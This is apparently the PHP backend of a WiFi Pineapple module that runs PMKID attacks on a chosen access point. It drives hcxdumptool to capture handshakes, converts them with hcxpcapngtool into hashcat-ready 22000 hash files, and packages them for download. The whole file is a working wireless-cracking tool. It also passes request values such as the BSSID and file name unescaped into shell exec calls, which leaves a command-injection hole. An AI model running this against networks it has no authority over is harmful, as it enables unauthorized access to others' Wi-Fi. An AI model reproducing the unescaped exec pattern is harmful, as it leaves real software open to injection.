<?php

namespace pineapple;

require_once("/pineapple/modules/PineAP/api/PineAPHelper.php");

class PMKIDAttack extends Module
{
    const MODULE_PATH = "/pineapple/modules/PMKIDAttack";
    const LOG_PATH = "/pineapple/modules/PMKIDAttack/log/module.log";
    const CAPTURE_PATH = "/pineapple/modules/PMKIDAttack/pcapng";
    const DEPS_FLAG = "/tmp/PMKIDAttack.progress";
    const EXPORT_PATH = "/tmp/pmkid-handshake.tmp";
    const TOOLS_PATH = "/sbin/";
    const TOOLS_SD_PATH = "/sd/sbin/";

    public function route()
    {
        switch ($this->request->action) {
            case "clearLog":
                $this->clearLog();
                break;
            case "getLog":
                $this->getLog();
                break;
            case "getDependenciesStatus":
                $this->getDependenciesStatus();
                break;
            case "managerDependencies":
                $this->managerDependencies();
                break;
            case "getDependenciesInstallStatus":
                $this->getDependenciesInstallStatus();
                break;
            case "startAttack":
                $this->startAttack();
                break;
            case "stopAttack":
                $this->stopAttack();
                break;
            case "catchPMKID":
                $this->catchPMKID();
                break;
            case "getPMKIDFiles":
                $this->getPMKIDFiles();
                break;
            case "downloadPMKID":
                $this->downloadPMKID();
                break;
            case "deletePMKID":
                $this->deletePMKID();
                break;
            case "viewAttackLog":
                $this->viewAttackLog();
                break;
            case "getStatusAttack":
                $this->getStatusAttack();
                break;
        }
    }

    protected function getToolPath($tool)
    {
        if ($this->isSDAvailable() && file_exists(self::TOOLS_SD_PATH . $tool)) {
            return self::TOOLS_SD_PATH . $tool;
        }

        return self::TOOLS_PATH . $tool;
    }

    protected function getCapPath()
    {
        $BSSID = $this->getBSSID(true);

        return "/tmp/{$BSSID}.pcapng";
    }

    protected function clearLog()
    {
        exec("rm " . self::LOG_PATH);
    }

    protected function getLog()
    {
        if (!file_exists(self::LOG_PATH)) {
            touch(self::LOG_PATH);
        }

        $this->response = ["moduleLog" => file_get_contents(self::LOG_PATH)];
    }

    protected function addLog($massage)
    {
        $entry = "[" . date("Y-m-d H:i:s") . "] {$massage}\n";
        file_put_contents(self::LOG_PATH, $entry, FILE_APPEND);
    }

    protected function getDependenciesStatus()
    {
        $response = [
            "installed" => false,
            "install" => "Install",
            "installLabel" => "success",
            "processing" => false
        ];

        if (file_exists(self::DEPS_FLAG)) {
            $response["install"] = "Installing...";
            $response["installLabel"] = "warning";
            $response["processing"] = true;
        } else if (!$this->checkPanelVersion()) {
            $response["install"] = "Upgrade Pineapple version first!";
            $response["installLabel"] = "warning";
        } else if ($this->checkDependencyInstalled()) {
            $response["install"] = "Remove";
            $response["installLabel"] = "danger";
            $response["installed"] = true;
        }

        $this->response = $response;
    }

    protected function checkPanelVersion()
    {
        $version = \helper\getFirmwareVersion();
        $version = str_replace("+", "", $version);

        return version_compare($version, "2.8.0") >= 0;
    }

    protected function checkDependencyInstalled()
    {      
        if ($this->uciGet("pmkidattack.@config[0].installed")) {
            return true; 
        }

        if ($this->checkDependency("hcxdumptool")) {
            $this->uciSet("pmkidattack.@config[0].installed", "1");
            return true; 
        }

        return false;
    }

    protected function managerDependencies()
    {
        $action = $this->checkDependencyInstalled() ? "remove" : "install";
        $command = self::MODULE_PATH . "/scripts/dependencies.sh";

        $this->stopAttack();
        $this->execBackground("{$command} {$action}");

        $this->response = ["success" => true];
    }

    protected function getDependenciesInstallStatus()
    {
        $this->response = ["success" => !file_exists(self::DEPS_FLAG)];
    }

    protected function getMonitorInterface()
    {
        return $this->uciGet("pineap.@config[0].pineap_interface");
    }

    protected function getBSSID($clean = false)
    {
        $bssid = $this->uciGet("pmkidattack.@config[0].bssid");

        return $clean ? str_replace(":", "", $bssid) : $bssid;
    }

    protected function getProcessStatus()
    {
        return \helper\checkRunning($this->getToolPath("hcxdumptool"));
    }

    protected function startAttack()
    {
        $ssid = $this->request->ssid;
        $bssid = $this->request->bssid;

        //$this->execBackground("{$this->moduleFolder}/scripts/PMKIDAttack.sh start " . $this->request->bssid);
        $this->uciSet("pmkidattack.@config[0].ssid", $ssid);
        $this->uciSet("pmkidattack.@config[0].bssid", $bssid);
        $this->uciSet("pmkidattack.@config[0].attack", "1");

        $pineAPHelper = new PineAPHelper();
        $pineAPHelper->disablePineAP();

        $cleanBSSID = $this->getBSSID(true);
        $interface = $this->getMonitorInterface();
        $capPath = $this->getCapPath();
        $hcxdumptoolPath = $this->getToolPath("hcxdumptool");
        $filterPath = self::MODULE_PATH . "/scripts/filter.txt";

        exec("ifconfig -a | grep {$interface}", $interfaceCheck);
        if (empty($interfaceCheck)) {
            $originalInterface = str_replace('mon', '', $interface);
            exec("airmon-ng start {$originalInterface}");
        }

        exec("echo {$cleanBSSID} > {$filterPath}");
        $command = "{$hcxdumptoolPath} -o {$capPath} -i {$interface} --filterlist_ap={$filterPath} --filtermode=2 --enable_status=1";
        $this->execBackground($command);
        $this->addLog("Start attack {$bssid}");
        $this->addLog($command);

        $this->response = ["success" => true];
    }

    protected function stopAttack()
    {
        $BSSIDFormatted = $this->getBSSID();
        $capPath = $this->getCapPath();

        //$this->execBackground("{$this->moduleFolder}/scripts/PMKIDAttack.sh stop");
        exec("/usr/bin/pkill hcxdumptool");
        exec("rm {$capPath}");

        $this->uciSet("pmkidattack.@config[0].ssid", "");
        $this->uciSet("pmkidattack.@config[0].bssid", "");
        $this->uciSet("pmkidattack.@config[0].attack", "0");
        $this->addLog("Stop attack {$BSSIDFormatted}");

        $this->response = ["success" => true];
    }


    protected function catchPMKID()
    {
        $check = $this->checkPMKID();
        if ($check['status']) {
            $BSSID = $this->getBSSID(true);
            $BSSIDFormatted = $this->getBSSID();
            $capPath = $this->getCapPath();
            $captureFolder = self::CAPTURE_PATH;

            $this->addLog("PMKID {$BSSIDFormatted} intercepted!");
            $metadata = json_encode([
                'ssid' => $this->uciGet("pmkidattack.@config[0].ssid"),
                'bssid' => $BSSIDFormatted
            ]);
            file_put_contents("{$captureFolder}/{$BSSID}.data", $metadata);
            exec("cp {$capPath} {$captureFolder}/");
        }

        $this->response = [
            "pmkidLog" => $check['log'],
            "process" => $check['process'],
            "success" => $check['status'],
        ];
    }

    protected function checkPMKID()
    {
        $capPath = $this->getCapPath();
        $exportPath = self::EXPORT_PATH;
        $hcxpcaptoolPath = $this->getToolPath("hcxpcapngtool"); // old name hcxpcaptool
        if (!file_exists($capPath)) {
            return false;
        }

        // hcxpcaptool 6.0   : -z <file> : output PMKID file (hashcat hashmode -m 16800 old format and john)
        // hcxpcapngtool 6.1 : -o <file> : output WPA-PBKDF2-PMKID+EAPOL (hashcat -m 22000)hash file
        //exec("{$this->moduleFolder}/scripts/PMKIDAttack.sh check-bg " . $this->getBSSID(true));
        exec("{$hcxpcaptoolPath} -o {$exportPath} {$capPath}", $result);
        $log = implode("\n", $result);

        return [
            'log' => $log,
            'process' => $this->getProcessStatus(),

            // on hcxpcaptool 6.0
            //'status' => strpos($log, " handshake(s) written to") !== false && strpos($log, "0 handshake(s) written to") === false,

            // on hcxpcaptool 6.1/6.2
            'status' => strpos($log, "Information: no hashes written to hash files") === false && strpos($log, "This dump file does not contain enough EAPOL") === false,
        ];
    }

    protected function getPMKIDFiles()
    {
        $captureFolder = self::CAPTURE_PATH;
        $pmkids = [];
        foreach (glob("{$captureFolder}/*.pcapng") as $capture) {
            $file = basename($capture, ".pcapng");
            $metadata = file_get_contents("{$captureFolder}/{$file}.data");
            if ($metadata) {
                $captureMetadata = json_decode($metadata, true);
                $name = "{$captureMetadata['ssid']} ({$captureMetadata['bssid']})";
            } else {
                $name = implode(str_split($file, 2), ":");
            }

            $pmkids[] = [
                "file" => $file,
                "name" => $name
            ];
        }

        $this->response = ["pmkids" => $pmkids];
    }

    protected function downloadPMKID()
    {
        $file = $this->request->file;
        $workingDir = "/tmp/PMKIDAttack";
        $captureFolder = self::CAPTURE_PATH;
        $hcxpcaptoolPath = $this->getToolPath("hcxpcapngtool");

        exec("mkdir {$workingDir}");
        exec("cp {$captureFolder}/{$file}.pcapng {$workingDir}/");
        exec("{$hcxpcaptoolPath} -o {$workingDir}/pmkid.22000 {$workingDir}/{$file}.pcapng &> {$workingDir}/report.txt");
        exec("cd {$workingDir}/ && tar -czf /tmp/{$file}.tar.gz *");
        exec("rm -rf {$workingDir}/");

        $this->response = ["download" => $this->downloadFile("/tmp/{$file}.tar.gz")];
    }

    protected function deletePMKID()
    {
        $file = escapeshellarg($this->request->file);
        $captureFolder = self::CAPTURE_PATH;
        exec("rm {$captureFolder}/{$file}.pcapng {$captureFolder}/{$file}.data");

        $this->response = ["success" => true];
    }

    protected function viewAttackLog()
    {
        $file = $this->request->file;
        $exportPath = self::EXPORT_PATH;
        $captureFolder = self::CAPTURE_PATH;
        $hcxpcaptoolPath = $this->getToolPath("hcxpcapngtool");

        $capPath = empty($file) ? $this->getCapPath() : escapeshellarg("{$captureFolder}/{$file}.pcapng");
        exec("{$hcxpcaptoolPath} -o {$exportPath} {$capPath}", $result);

        $this->response = ["pmkidLog" => implode("\n", $result)];
    }

    protected function getStatusAttack()
    {
        $this->response = [
            "process" => $this->getProcessStatus(),
            "ssid" => $this->uciGet("pmkidattack.@config[0].ssid"),
            "bssid" => $this->uciGet("pmkidattack.@config[0].bssid"),
            "attack" => $this->uciGet("pmkidattack.@config[0].attack") === true,
        ];
    }
}
